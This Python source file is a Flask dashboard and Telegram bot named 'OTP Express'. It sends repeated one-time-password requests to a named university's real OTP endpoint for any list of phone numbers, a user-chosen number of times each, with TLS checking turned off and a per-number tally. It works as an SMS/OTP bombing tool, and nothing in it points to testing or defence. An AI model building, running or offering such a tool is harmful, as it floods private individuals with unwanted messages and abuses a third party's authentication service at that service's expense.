import os
import time
import requests
import telebot
from flask import Flask, render_template, request
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

OTP_GEN_URL = "https://twofa.srmu.ac.in/otp/generate"

otp_tracker = {}

# ===== TELEGRAM BOT SETUP =====
API_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
bot = telebot.TeleBot(API_TOKEN)


# ===================== CORE FUNCTION =====================

def send_otps(numbers, otp_count):
    session = requests.Session()
    session.verify = False

    batch_results = []

    for phone in numbers:
        sent = 0
        otp_tracker.setdefault(phone, 0)

        for _ in range(otp_count):
            try:
                session.post(f"{OTP_GEN_URL}/{phone}/123", timeout=10)

                sent += 1
                otp_tracker[phone] += 1

                time.sleep(1)

            except Exception as e:
                batch_results.append({
                    "phone": phone,
                    "status": f"Error: {str(e)}",
                    "sent_now": sent,
                    "total_sent": otp_tracker[phone]
                })
                break

        else:
            batch_results.append({
                "phone": phone,
                "status": "OTP sent",
                "sent_now": sent,
                "total_sent": otp_tracker[phone]
            })

    return batch_results


# ===================== TELEGRAM BOT HANDLERS =====================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(
        message,
        "Welcome to OTP Express!\n\n"
        "Use command:\n"
        "/send <phone1,phone2> <count>\n\n"
        "Example:\n"
        "/send 9876543210,1234567890 5"
    )


@bot.message_handler(commands=['send'])
def handle_send_otp(message):
    try:
        args = message.text.split()

        if len(args) < 3:
            bot.reply_to(message, "Usage: /send <phone1,phone2> <count>")
            return

        phones_raw = args[1]

        try:
            otp_count = int(args[2])
            if otp_count <= 0:
                raise ValueError
        except ValueError:
            bot.reply_to(message, "OTP count must be positive number.")
            return

        numbers = [
            n.strip() for n in phones_raw.split(",")
            if n.strip().isdigit()
        ]

        if not numbers:
            bot.reply_to(message, "Invalid phone numbers.")
            return

        bot.reply_to(message, f"🚀 Sending OTP to {len(numbers)} numbers...")

        results = send_otps(numbers, otp_count)

        response = ["✅ OTP Result:"]
        for r in results:
            response.append(
                f"📱 {r['phone']} → {r['status']} | Sent: {r['sent_now']} | Total: {r['total_sent']}"
            )

        bot.reply_to(message, "\n".join(response))

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


@bot.message_handler(commands=['status'])
def handle_status(message):
    if not otp_tracker:
        bot.reply_to(message, "No activity yet.")
        return

    msg = "📊 OTP Tracker:\n"
    for phone, total in otp_tracker.items():
        msg += f"📱 {phone}: {total}\n"

    bot.reply_to(message, msg)


# ===================== TELEGRAM WEBHOOK =====================

@app.route("/telegram-webhook", methods=["POST"])
def telegram_webhook():
    json_str = request.get_data().decode("UTF-8")
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return "OK", 200


def set_webhook():
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL")

    if not WEBHOOK_URL:
        print("❌ WEBHOOK_URL not set in env!")
        return

    bot.remove_webhook()
    time.sleep(1)

    bot.set_webhook(url=WEBHOOK_URL)
    print("✅ Webhook set to:", WEBHOOK_URL)


# ===================== FLASK DASHBOARD =====================

@app.route("/", methods=["GET", "POST"])
def index():
    results = []
    error = None

    if request.method == "POST":
        numbers_raw = request.form.get("numbers", "").strip()
        otp_count = request.form.get("otp_count", "1").strip()

        if not numbers_raw:
            error = "Enter at least one number."
            return render_template("index.html", error=error)

        try:
            otp_count = int(otp_count)
            if otp_count <= 0:
                raise ValueError
        except ValueError:
            error = "OTP count must be positive."
            return render_template("index.html", error=error)

        numbers = [
            n.strip() for n in numbers_raw.replace("\n", ",").split(",")
            if n.strip().isdigit()
        ]

        results = send_otps(numbers, otp_count)

    return render_template(
        "index.html",
        results=results,
        tracker=otp_tracker,
        error=error
    )


# ===================== START APP =====================

if __name__ == "__main__":
    set_webhook()
    app.run(host="0.0.0.0", port=10000)
